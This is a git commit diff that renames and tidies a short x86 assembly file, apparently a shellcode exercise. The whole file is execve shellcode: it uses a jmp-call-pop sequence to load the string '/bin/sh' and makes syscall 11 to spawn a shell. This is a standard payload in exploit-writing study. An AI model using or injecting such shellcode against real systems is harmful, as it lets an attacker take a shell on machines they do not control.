ed85c85e71dfcc3b06a1c3275823892f5783048a
Oelin <42823429+Oelin@users.noreply.github.com>
2020-07-21 14:58:11 +0100

    Update and rename source/execve_tiny.asm to src/execve_tiny.s

--- src/execve_tiny.s
+++ src/execve_tiny.s
@@ -1,18 +1,13 @@
 section .text:
     global _start
-
 _start:
     jmp short two
-
 one:
     pop ebx
-
     xor ecx, ecx
     xor edx, edx
-
     mov al, 11
     int 128
-
 two:
     call one
     db "/bin/sh"
